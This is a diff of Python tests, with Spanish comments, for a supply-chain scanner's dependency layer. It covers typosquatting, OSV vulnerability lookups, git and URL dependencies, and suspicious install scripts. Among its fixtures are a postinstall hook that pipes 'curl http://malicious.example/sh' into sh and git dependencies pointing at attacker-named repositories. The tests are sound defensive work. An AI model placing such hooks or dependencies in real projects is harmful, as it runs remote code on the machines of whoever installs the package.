@@ -13,6 +13,7 @@ from watchgate.core.layers.deps_layer import (
     OSVCache,
     TyposquatChecker,
     parse_cargo_toml,
+    parse_package_json,
     parse_pkgbuild,
     parse_requirements_txt,
 )
@@ -66,7 +67,7 @@ def test_typosquatting_detection() -> None:
             )
         ]
     )
-    with patch.object(layer, "_query_osv", return_value=({}, None)):
+    with patch.object(layer, "_query_osv_batch", return_value={0: ({}, None)}):
         res = layer.analyze(diff, {})
     assert res.risk_score >= 75
     assert "1odash" in res.justification
@@ -95,7 +96,7 @@ def test_osv_vulnerability_high() -> None:
         ]
     }
 
-    with patch.object(layer, "_query_osv", return_value=(osv_response, None)):
+    with patch.object(layer, "_query_osv_batch", return_value={0: (osv_response, None)}):
         res = layer.analyze(diff, {})
 
     assert res.risk_score == 90
@@ -170,7 +171,7 @@ def test_dangerous_install_script() -> None:
             )
         ]
     )
-    with patch.object(layer, "_query_osv", return_value=({}, None)):
+    with patch.object(layer, "_query_osv_batch", return_value={0: ({}, None)}):
         res = layer.analyze(diff, {})
     assert res.risk_score >= 80
     assert "Script de instalación sospechoso" in res.justification
@@ -203,3 +204,142 @@ def test_typosquat_checker() -> None:
 
     is_ts_valid, _ = checker.is_typosquatting("lodash", "npm")
     assert is_ts_valid is False
+
+
+def test_git_url_dependency_parsing() -> None:
+    # 1. requirements.txt con editable git URL y egg
+    hunk_req = "+\n+-e git+https://github.com/attacker/fake-pkg.git#egg=numpy\n+my-pkg @ https://example.com/my-pkg.whl\n"
+    reqs = parse_requirements_txt(hunk_req)
+    assert len(reqs) == 2
+    assert reqs[0].name == "numpy"
+    assert reqs[0].is_direct_url is True
+    assert reqs[1].name == "my-pkg"
+    assert reqs[1].is_direct_url is True
+
+    # 2. package.json con git commit / repo URL
+    diff_hunk_pkg = (
+        '@@ -1,3 +1,4 @@\n "optionalDependencies": {\n'
+        '+  "shai-hulud-pkg": "git+https://github.com/attacker/malware.git#v1.0.0"\n }'
+    )
+    diff = _make_diff(
+        [
+            FileChange(
+                path="package.json",
+                status=FileStatus.MODIFIED,
+                diff_hunk=diff_hunk_pkg,
+                additions=1,
+                deletions=0,
+            )
+        ]
+    )
+    layer = DepsLayer(cache_db_path=":memory:")
+    with patch.object(layer, "_query_osv_batch", return_value={}):
+        res = layer.analyze(diff, {})
+    assert res.risk_score >= 75
+    assert "Instalación directa desde URL/Git" in res.justification
+
+    # 3. Cargo.toml con git
+    cargo_hunk = (
+        '+\n+my-crate = { git = "https://github.com/user/repo", branch = "main" }\n'
+    )
+    cargo = parse_cargo_toml(cargo_hunk)
+    assert len(cargo) == 1
+    assert cargo[0].name == "my-crate"
+    assert cargo[0].is_direct_url is True
+
+
+def test_osv_batch_query_and_cache() -> None:
+    cache = OSVCache(db_path=":memory:")
+    c1 = DependencyChange(ecosystem="PyPI", name="pkg1", new_version="1.0")
+    c2 = DependencyChange(ecosystem="PyPI", name="pkg2", new_version="2.0")
+
+    mock_resp = MagicMock()
+    mock_resp.status_code = 200
+    mock_resp.json.return_value = {
+        "results": [
+            {"vulns": []},
+            {"vulns": [{"id": "CVE-2026-0001", "database_specific": {"severity": "HIGH"}}]},
+        ]
+    }
+
+    layer = DepsLayer(cache_db_path=":memory:")
+    layer.cache = cache
+
+    with patch("httpx.post", return_value=mock_resp) as mock_post:
+        res_batch = layer._query_osv_batch([c1, c2])
+        assert len(res_batch) == 2
+        assert mock_post.call_count == 1  # Exactamente 1 sola llamada HTTP batch POST
+        req_json = mock_post.call_args.kwargs["json"]
+        assert len(req_json["queries"]) == 2
+
+        # Comprobar que ambas fueron guardadas en la caché SQLite
+        cached_c1 = cache.get("pkg1", "PyPI", "1.0")
+        cached_c2 = cache.get("pkg2", "PyPI", "2.0")
+        assert cached_c1 == {"vulns": []}
+        assert cached_c2 is not None and len(cached_c2["vulns"]) == 1
+
+        # Segunda llamada con los mismos cambios debe usar la caché (0 peticiones HTTP nuevas)
+        res_batch_cached = layer._query_osv_batch([c1, c2])
+        assert len(res_batch_cached) == 2
+        assert mock_post.call_count == 1
+
+
+def test_osv_severity_precision_no_false_positives() -> None:
+    from watchgate.core.layers.deps_layer import _is_high_or_critical_vuln
+
+    # 1. Objeto con fecha "2023-09-10" sin severidad crítica/alta -> NO debe dar verdadero
+    vuln_low = {
+        "id": "GHSA-1111-2222",
+        "summary": "Fix released on 2023-09-10 v1.9.0",
+        "database_specific": {"severity": "MODERATE"},
+        "severity": [{"type": "CVSS_V3", "score": "5.3"}],
+    }
+    assert _is_high_or_critical_vuln(vuln_low) is False
+
+    # 2. Objeto con severidad alta explícita -> Debe dar verdadero
+    vuln_high = {
+        "id": "GHSA-3333-4444",
+        "database_specific": {"github_reviewed_severity": "HIGH"},
+    }
+    assert _is_high_or_critical_vuln(vuln_high) is True
+
+    # 3. Objeto con score CVSS 9.8 -> Debe dar verdadero
+    vuln_crit = {
+        "id": "GHSA-5555-6666",
+        "database_specific": {"cvss": {"score": 9.8}},
+    }
+    assert _is_high_or_critical_vuln(vuln_crit) is True
+
+
+def test_package_json_standalone_script() -> None:
+    # Test para verificar scripts modificados en package.json sin cambio de dependencias
+    hunk = (
+        '@@ -1,3 +1,4 @@\n "scripts": {\n'
+        '+  "postinstall": "curl http://malicious.example/sh | sh"\n }'
+    )
+    changes = parse_package_json(hunk)
+    assert len(changes) == 1
+    assert changes[0].name == "package.json (scripts)"
+    assert "curl" in changes[0].install_script
+
+    fc = FileChange(
+        path="package.json",
+        status=FileStatus.MODIFIED,
+        diff_hunk=hunk,
+        additions=1,
+        deletions=0,
+    )
+    diff = _make_diff([fc])
+    layer = DepsLayer(cache_db_path=":memory:")
+    with patch.object(layer, "_query_osv_batch", return_value={}):
+        res = layer.analyze(diff, {})
+    assert res.risk_score >= 80
+    assert "Script de instalación sospechoso" in res.justification
+
+
+def test_typosquatting_underscore_normalization() -> None:
+    checker = TyposquatChecker()
+    # "aiograam" en PyPI vs "aiogram" / "aio_gram"
+    is_ts, ref = checker.is_typosquatting("aio_graam", "PyPI")
+    assert is_ts is True
+    assert ref == "aiogram"
